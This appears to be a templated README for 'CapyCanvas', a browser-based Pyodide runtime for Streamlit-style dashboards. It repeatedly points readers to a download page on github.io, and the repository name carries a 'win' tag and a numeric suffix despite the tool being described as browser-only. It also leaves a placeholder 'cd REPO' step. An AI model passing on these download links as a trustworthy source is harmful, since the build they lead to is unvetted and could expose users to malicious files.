# CapyCanvas - Browser-Native Data App Runtime 2026

> **CapyCanvas is a Web browser runtime for building and exporting Python-powered data science apps with interactive dashboards, widgets, and charts without requiring a server.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hwagner1981/capycanvas-win-39587?style=flat-square)](https://github.com/hwagner1981/capycanvas-win-39587)

---

<p align="center">
  <a href="https://hwagner1981.github.io/capycanvas-win-39587/">
    <img src="https://img.shields.io/badge/Download-CapyCanvas%20Latest-brightgreen?style=for-the-badge" alt="Download CapyCanvas">
  </a>
</p>

> **[Direct Download - CapyCanvas](https://hwagner1981.github.io/capycanvas-win-39587/)**

---

[Download Latest Build](https://hwagner1981.github.io/capycanvas-win-39587/)

---

## About CapyCanvas

CapyCanvas brings data-app development into the browser by combining Python execution through Pyodide with a Streamlit-inspired application model. It is designed for interactive dashboards and data science experiences that use widgets, charts, caching, and session state while running without a server backend.

The runtime supports both developers assembling and testing applications and clients using packaged browser-based outputs. Data files can be staged for an app or embedded directly into exported single-file HTML, making it possible to distribute self-contained data apps through a browser-oriented workflow.

---

## Features

- Execute Python directly in a Web browser without a server.
- Build interfaces with a Streamlit-inspired API.
- Add interactive widgets, charts, caching, and session state.
- Re-run the complete script when users interact with the app.
- Install Python packages on demand with pip directives.
- Organize dependencies and data through dedicated staging panels.
- Embed data files into exported single-file HTML documents.
- Choose between Client and Developer audience modes.
- Export applications as Packaged or Logic-only builds.
- Present client-friendly error messages during app use.
- Split modular source files and rebuild them as needed.

---

## Installation

Clone the repository or download the latest browser build:

```bash
git clone https://github.com/hwagner1981/capycanvas-win-39587.git
cd REPO
```

Open the CapyCanvas entry page in a modern Web browser. If you downloaded a packaged build, launch its HTML file directly and use the available editor or runtime panels to prepare the application.

Because CapyCanvas is browser-native, the primary installation step is obtaining the HTML-based build rather than installing a separate server runtime.

---

## Usage

A typical workflow looks like this:

1. Open CapyCanvas in a Web browser.
2. Create or load the Python source for the data app.
3. Add widgets, charts, and application logic through the Streamlit-inspired API.
4. Declare any required packages with pip directives.
5. Stage dependencies and data files in the corresponding panels.
6. Run the app and interact with its controls.
7. Review the full script re-run behavior after each interaction.
8. Export the result as a Packaged or Logic-only build.
9. Optionally embed data files into a single-file HTML output for distribution.

For modular projects, split the source into separate files during development and rebuild the application when the source structure changes.

---

## Configuration

CapyCanvas configuration is handled through the browser application and its source project rather than a separate service configuration file.

Use the available panels to manage:

- Python package directives and dependency installation.
- Data files required by the application.
- Audience mode for client-facing or developer workflows.
- Export mode for Packaged or Logic-only output.
- Source modules that should be split or rebuilt.
- Data embedding for standalone HTML exports.

---

## Requirements

- A modern Web browser with support for browser-based Python execution.
- Access to the CapyCanvas HTML build or a local clone of the repository.
- Additional storage for Python packages and staged data used by an app.
- Internet access may be needed when packages are installed on demand.
- No separate application server is required for the browser runtime.

---

## FAQ

### Does CapyCanvas require a backend?

No separate server backend is required for its browser-based Python runtime. Applications execute in the Web browser through Pyodide.

### Who is CapyCanvas intended for?

It supports developers creating data apps as well as clients consuming packaged browser-based applications.

### How are Python dependencies added?

Dependencies can be requested on demand through pip directives and managed from the dependency staging workflow.

### Can data be distributed with an app?

Yes. Data files can be staged for an application and embedded directly into an exported single-file HTML document.

### What happens when a user changes a widget?

The full application script is re-run when an interaction occurs, allowing the displayed output to respond to updated state.

### Which export mode should I use?

Use Packaged mode when preparing a complete application output. Logic-only mode is available when the application logic should be exported separately from the packaged runtime.

### What should I check if an app reports an error?

Review the displayed client error message, then check the source, package directives, staged dependencies, and data files. Rebuild modular source files if the project has been split into separate modules.

### How are updates delivered?

Use the latest available build from the project download link or update the local repository clone before opening the browser-based runtime.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
